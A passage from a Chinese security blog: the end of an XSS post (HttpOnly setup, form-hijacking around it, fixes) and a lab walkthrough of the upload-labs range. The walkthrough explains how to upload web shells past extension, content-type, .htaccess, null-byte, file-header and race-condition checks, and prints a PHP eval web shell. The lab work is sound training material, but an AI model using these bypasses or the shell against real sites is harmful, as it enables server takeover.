但是还是存在xss跨站语句，阻止的仅仅是获取cookie</p><p>各个主流的脚本语言都支持HttpOnly</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image50.jpg" alt="image50"></p><h2 id="2-HttpOnly的设置样例"><a href="#2-HttpOnly的设置样例" class="headerlink" title="2.HttpOnly的设置样例"></a>2.HttpOnly的设置样例</h2><h3 id="1-JavaEE"><a href="#1-JavaEE" class="headerlink" title="(1).JavaEE"></a>(1).JavaEE</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">response.setHeader(<span class="string">&quot;Set-Cookie&quot;</span>, <span class="string">&quot;cookiename=value;</span></span><br><span class="line"><span class="string">Path=/;Domain=domainvalue;Max-Age=seconds;HTTPOnly&quot;</span>);</span><br></pre></td></tr></table></figure><p>具体参数的含义再次不做阐述，设置完毕后通过js脚本是读不到该cookie的，但使用如下方式可以读取</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie cookies[]=request.getCookies();</span><br></pre></td></tr></table></figure><h3 id="2-C"><a href="#2-C" class="headerlink" title="(2).C"></a>(2).C</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HttpCookie myCookie = <span class="keyword">new</span> HttpCookie(<span class="string">&quot;myCookie&quot;</span>);   </span><br><span class="line">myCookie.HttpOnly = <span class="literal">true</span>;   </span><br><span class="line">Response.AppendCookie(myCookie);</span><br></pre></td></tr></table></figure><h3 id="3-VB-NET"><a href="#3-VB-NET" class="headerlink" title="(3).VB.NET"></a>(3).VB.NET</h3><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Dim</span> myCookie <span class="keyword">As</span> HttpCookie = <span class="built_in">new</span> HttpCookie(<span class="string">&quot;myCookie&quot;</span>)   </span><br><span class="line">myCookie.HttpOnly = <span class="literal">True</span>   </span><br><span class="line">Response.AppendCookie(myCookie)</span><br></pre></td></tr></table></figure><h3 id="4-php≥5-2"><a href="#4-php≥5-2" class="headerlink" title="(4).php≥5.2"></a>(4).php≥5.2</h3><p>PHP5.2以上版本已支持HttpOnly参数的设置，同样也支持全局的HttpOnly的设置，在php.ini中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.cookie_httponly =</span><br></pre></td></tr></table></figure><p>设置其值为1或者TRUE，来开启全局的Cookie的HttpOnly属性，当然也支持在代码中来开启：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  ini_set(<span class="string">&quot;session.cookie_httponly&quot;</span>, <span class="number">1</span>); </span><br><span class="line"> <span class="comment">// or</span></span><br><span class="line">  session_set_cookie_params(<span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">TRUE</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Cookie操作函数setcookie函数和setrawcookie函数也专门添加了第7个参数来做为HttpOnly的选项，开启方法为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setcookie(<span class="string">&quot;abc&quot;</span>, <span class="string">&quot;test&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">TRUE</span>); </span><br><span class="line"> setrawcookie(<span class="string">&quot;abc&quot;</span>, <span class="string">&quot;test&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">TRUE</span>);</span><br></pre></td></tr></table></figure><h3 id="5-PHP4和PHP≤5-1"><a href="#5-PHP4和PHP≤5-1" class="headerlink" title="(5).PHP4和PHP≤5.1"></a>(5).PHP4和PHP≤5.1</h3><p>对于PHP5.1以前版本以及PHP4版本的话，则需要通过header函数来变通下了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  header(<span class="string">&quot;Set-Cookie: hidden=value; httpOnly&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="3-反制HttpOnly"><a href="#3-反制HttpOnly" class="headerlink" title="3.反制HttpOnly"></a>3.反制HttpOnly</h2><p>当对方开启HttpOnly时，盗取cookie就会失败。登录后台的方式有Cookie登录和账号密码登录</p><h3 id="1-Cookie形式"><a href="#1-Cookie形式" class="headerlink" title="(1).Cookie形式"></a>(1).Cookie形式</h3><h3 id="2-直接账号密码登录"><a href="#2-直接账号密码登录" class="headerlink" title="(2).直接账号密码登录"></a>(2).直接账号密码登录</h3><ul><li><h3 id="读取保存账号密码"><a href="#读取保存账号密码" class="headerlink" title="读取保存账号密码"></a>读取保存账号密码</h3></li></ul><p>通过窃取保存在本地的数据（账号密码）来登录后台（<strong>需要xss产生于后台</strong>，利用表单劫持）</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image51.jpg" alt="image51"></p><p>type、id、name通过查看网站源代码中的登录框表单</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image52.jpg" alt="image52"></p><ul><li><h3 id="读取没保存账号密码"><a href="#读取没保存账号密码" class="headerlink" title="读取没保存账号密码"></a>读取没保存账号密码</h3></li></ul><p>通过表单（登录框）劫持数据（<strong>产生在登陆地址的XSS，例如存储型XSS留言等</strong>）</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image53.jpg" alt="image53"></p><p>劫持原理：抓取数据包另外发送一份到跨站平台</p><p><img src="/2022/02/22/XSS%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%AE%A2%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0/image54.jpg" alt="image54"></p><p>但是如果是https网站的话，数据是进行了ssl加密，获取了数据之后也是很难读取到账号密码的，鸡肋方法。</p><h1 id="十一-安全修复方案"><a href="#十一-安全修复方案" class="headerlink" title="十一.安全修复方案"></a>十一.安全修复方案</h1><ul><li>开启HttpOnly</li><li>过滤输入：对输入进行过滤，不允许可能导致XSS攻击的字符输入</li><li>过滤输出：根据输出点的位置对输出到前端的内容进行适当转义</li><li>PHP（被阻断）：<a href="https://link.zhihu.com/?target=http://www.zuimoge.com/212.html">http://www.zuimoge.com/212.html</a></li><li>关于XSS漏洞修复（JAVA）：[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/baixianshen">https://www.cnblogs.com/baixianshen</a></li></ul></div><footer class="post-footer"><div class="post-eof"></div></footer></article><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://www.zymstudy.club/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/Panda.jpg"><meta itemprop="name" content="zym"><meta itemprop="description" content="生活日常随笔"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="猪哥的博客"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a href="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/" class="post-title-link" itemprop="url">文件上传靶场练习</a></h2><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2021-12-28 15:46:26" itemprop="dateCreated datePublished" datetime="2021-12-28T15:46:26+08:00">2021-12-28</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2022-01-03 15:54:09" itemprop="dateModified" datetime="2022-01-03T15:54:09+08:00">2022-01-03</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">web安全渗透学习</span></a> </span></span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-comment"></i> </span><span class="post-meta-item-text">Valine：</span> <a title="valine" href="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/#valine-comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/" itemprop="commentCount"></span></a></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="far fa-file-word"></i> </span><span class="post-meta-item-text">本文字数：</span> <span>3.3k</span> </span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="far fa-clock"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span>3 分钟</span></span></div></header><div class="post-body" itemprop="articleBody"><h1 id="文件上传靶场练习"><a href="#文件上传靶场练习" class="headerlink" title="文件上传靶场练习"></a>文件上传靶场练习</h1><p>靶场资源链接：<a target="_blank" rel="noopener" href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></p><p>利用phpstudy搭建</p><h1 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h1><p><strong>查看源码</strong></p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image1.png" alt="image"></p><p><strong>创建一句话木马文件，并保存为png格式</strong></p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image2.png" alt="image2"></p><p><strong>上传，并用burpsuite开启抓包</strong></p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image3.png" alt="image3"></p><p><strong>将格式改为php</strong></p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image4.png" alt="image4"></p><p><strong>上传成功！可以访问一下，或者用菜刀工具连接。</strong></p><h1 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h1><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image5.png" alt="image5"></p><p>用burpsuite抓包时修改一下content-type为常见的图片类型，比如image/gif</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image6.png" alt="image6"></p><p>上传成功！</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image7.png" alt="image7"></p><h1 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h1><p>查看源码，可知此关设置了一个黑名单，来拒绝一些常见的脚本文件后缀，比如asp aspx php jsp等，但一些脚本文件有多个不同的后缀名来表示，比如php文件也可以写为phtml或者php3等。</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image8.png" alt="image8"></p><p>抓包将文件后缀名改为phtml</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image9.png" alt="image9"></p><p>上传成功！</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image10.png" alt="image10"></p><h1 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h1><p>查看源码，此关的黑名单更加全。</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image11.png" alt="image11"></p><p>但是没有发现对.htaccess文件的过滤，于是编写一个.htaccess，不能用记事本创建，用notepad++创建，保存为.htaccess文件名。</p><p><code>&lt;FilesMatch &quot;hack&quot;&gt;</code><br><code># 修改文件类型 – 下面可以让任何的文件都成为PHP那么被服务器解释</code><br><code>SetHandler application/x-httpd-php</code><br><code>AddType application/x-httpd-php .jpg</code><br><code>&lt;/FilesMatch&gt;</code></p><p>然后将.htaccess上传到服务器，接着直接上传一个hack.png文件，上面的.htaccess文件表示将任何的hack文件名的文件解析为php文件。</p><p>接着访问hack.png，解析成功！</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image12.png" alt="image12"></p><p>注：关于.htaccess文件，在apache的WEB环境中，我们经常会使用.htaccess这个文件来确定某个目录下的URL重写规则，特别是一些开源的CMS或者框架当中经常会用到，比如著名的开源论坛discuz!，就可以通过.htaccess文件实现URL的静态化，大部分PHP框架，例如ThinkPHP和Laravel，在apache环境下会用.htaccess文件实现路由规则。 但是如果.htaccess文件被攻击者修改的话，攻击者就可以利用apache的mod_cgi模块，直接绕过PHP的任何限制，来执行系统命令。</p><p>具体可参考<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/38246662">https://zhuanlan.zhihu.com/p/38246662</a></p><h1 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h1><p>此关黑名单中有.htaccess，因此利用.htaccess文件进行绕过不可行。</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image13.png" alt="image13"></p><p>我们可以看到，在对文件名进行处理的时候是先去点，然后去大小写，最后去空，这些操作是一次性的。于是我们可以这样对文件后缀进行处理，<code>hack.php. .</code>，这样的话处理得到的文件名为<code>hack.php.</code>，在windows中文件后缀的.会默认去掉，因此就会解析为php文件。</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image14.png" alt="image14"></p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image15.png" alt="image15"></p><h1 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h1><p>这关源代码里面少了行去大小写的处理，由于windows中是不区分大小写的，因此我们可以将文件后缀换为.pHP来进行绕过。</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image16.png" alt="image16"></p><p>上传文件后缀改为.pHP</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image17.png" alt="image17"></p><p>上传成功！</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image18.png" alt="image18"></p><h1 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h1><p>这关是缺少了去空，因此只需要在文件后缀加空格就行。</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image19.png" alt="image19"></p><p>文件后缀加空格</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image20.png" alt="image20"></p><p>上传成功！</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image21.png" alt="image21"></p><h1 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h1><p>此关缺少对文件后缀.的处理，只需要在文件后缀后面加.即可。</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/Users\朱易明\AppData\Roaming\Typora\typora-user-images\image-20211228185252928.png" alt="image-20211228185252928"></p><p>文件后缀加.</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image22.png" alt="image22"></p><p>上传成功！</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image23.png" alt="image23"></p><h1 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h1><p>第一种方法本关同第五关。</p><p>第二种方法是其代码并未对::$DATA做过滤</p><p>利用Windows下NTFS文件系统的一个特性，即NTFS文件系统的存储数据流的一个属性 DATA ，就是请求 a.asp 本身的数据，如果a.asp 还包含了其他的数据流，比如 a.asp:b.asp，请求 a.asp:b.asp::$DATA，则是请求a.asp中的流数据b.asp的流数据的内容。<br><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image24.png" alt="image24"></p><p>上传成功！</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image25.png" alt="image25"></p><h1 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h1><p>本关同第五关一样。</p><h1 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h1><p>这里解读一下源码</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image26.png" alt="image26"></p><p>文件名被替换</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image27.png" alt="image27"></p><p>因为此处只替换了一次，因此只需要进行双写就可以，文件名为hack.pphphp</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image28.png" alt="image28"></p><p>上传成功！</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image29.png" alt="image29"></p><h1 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h1><p>查看源码可知还是白名单过滤，分析源码可以看到系统在保存文件的时候对文件进行了重命名，利用GET获取save_path也就是url地址值，然后进行字符串的拼接。</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image30.png" alt="image30"></p><p>因此可以在url处进行处理，用burpsuite抓包，在save_path后面加上自定义的一个php文件名，并在其后面加上%00截断符，这样在进行文件重命名时截断符就会截断后面的拼接字符串。</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image31.png" alt="image31"></p><p>此处仍然会失败，因此%00截断的适用条件为：</p><ul><li><p>PHP版本&lt;5.3.4</p></li><li><p>php.ini中magic_quotes_gpc=off</p><p><strong>切换一下php版本</strong></p></li></ul><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image32.png" alt="image32"></p><p><strong>关闭魔术引号</strong></p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image33.png" alt="image33"></p><p><strong>上传成功！</strong></p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image34.png" alt="image34"></p><h1 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h1><p>查看本关源码，其实与12关类似，只不过提交参数save_path的方式变为了POST。</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image35.png" alt="image35"></p><p>因为是POST传递参数，因此%00不会像GET方式一样自动转码，得手动转码</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image36.png" alt="image36"></p><p>上传成功！</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image37.png" alt="image37"></p><h1 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h1><p>一些站点会使用文件头来检测文件类型，这种情况可以在文件前面加入对应的字节来绕过检查。几种常见的文件类型的头字节如下所示：</p><table><thead><tr><th>类型</th><th>十六进制值</th></tr></thead><tbody><tr><td>JPG</td><td>FFD8FFE000104A464946</td></tr><tr><td>GIF</td><td>474946383961</td></tr><tr><td>PNG</td><td>89504E47</td></tr><tr><td>TIF</td><td>49492A00</td></tr><tr><td>BMP</td><td>424D</td></tr></tbody></table><p>查看源码，服务端读取了上传文件的前两个字节来进行内容的判断，然后判断该文件是否在白名单之中。</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image38.png" alt="image38"></p><p>这样的话我们可以往要上传的文件头部添加对应格式的数据来完成绕过</p><p>比如在文件头部加入JPG的头部格式–FFD8FFE000104A464946，有十位，因此先在文件内容填入1234567891</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image39.png" alt="image39"></p><p>然后找到这十位数字对应的位置，将其改为JPG对应的十六进制格式</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image40.png" alt="image40"></p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image41.png" alt="image41"></p><p>简单来说，就是往一个正常的图片文件里面插入木马语句，上传成功后是以图片格式保存的，然后通过<strong>文件包含漏洞</strong>，将这个图片以脚本文件来执行。</p><p>比如这里用cmd命令将一个php文件和jpg图片结合在一起</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image42.png" alt="image42"></p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image43.png" alt="image43"></p><p>上传该png文件，然后通过文件包含漏洞来执行该文件</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image44.png" alt="image44"></p><p>文件马里面包含的php语句为<code>&lt;?php @eval($_POST[&#39;x&#39;]) ;?&gt;</code></p><p>POST方式传递参数<code>x=phpinfo();</code></p><p>执行成功！</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image45.png" alt="image45"></p><h1 id="Poss-15"><a href="#Poss-15" class="headerlink" title="Poss-15"></a>Poss-15</h1><p>本关的绕过方式与14关相同，这里主要介绍的是getimagesize()函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">getimagesize()函数:</span><br><span class="line"></span><br><span class="line">用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。</span><br><span class="line"></span><br><span class="line">getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。</span><br></pre></td></tr></table></figure><h1 id="Poss-16"><a href="#Poss-16" class="headerlink" title="Poss-16"></a>Poss-16</h1><p>本关绕过方式同上。这关使用exif_imagetype()函数来判断文件类型（需要开启php_exif模块）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exif_imagetype()函数：**</span><br><span class="line"></span><br><span class="line">判断一个图像的类型</span><br><span class="line"></span><br><span class="line">exif_imagetype() 读取一个图像的第一个字节并检查其签名。</span><br></pre></td></tr></table></figure><h1 id="Poss-17"><a href="#Poss-17" class="headerlink" title="Poss-17"></a><strong>Poss-17</strong></h1><p>本关绕过方式同上，只不过这里的判断方式是用了<code>imagecreatefromjpeg()</code>、<code>imagecreatefrompng()</code>、<code>imagecreatefromgif()</code>三个判断函数。</p><h1 id="Poss-18"><a href="#Poss-18" class="headerlink" title="Poss-18"></a>Poss-18</h1><p>分析源码</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image46.png" alt="image46"></p><p>我这里修改服务器代码，输出upload_file和temp_file</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image47.png" alt="image47"></p><p>上传一个php文件</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image48.png" alt="image48"></p><p>现在连利用burosuite续上传一个php文件，然后中途访问</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image49.png" alt="image49"></p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image50.png" alt="image50"></p><p>开始发送，中途不断访问这个hack.php文件，中途会偶尔有这个显示然后刷新又消失，这是说明这个php文件短暂的存储与服务器中。</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image51.png" alt="image51"></p><h1 id="Poss-19"><a href="#Poss-19" class="headerlink" title="Poss-19"></a>Poss-19</h1><p>按理来说这关和18关一样，但我中途完全访问不到上传的php文件，清除了浏览器缓存也不行，待解。</p><h1 id="Poss-20"><a href="#Poss-20" class="headerlink" title="Poss-20"></a>Poss-20</h1><p>分析源码</p><p><img 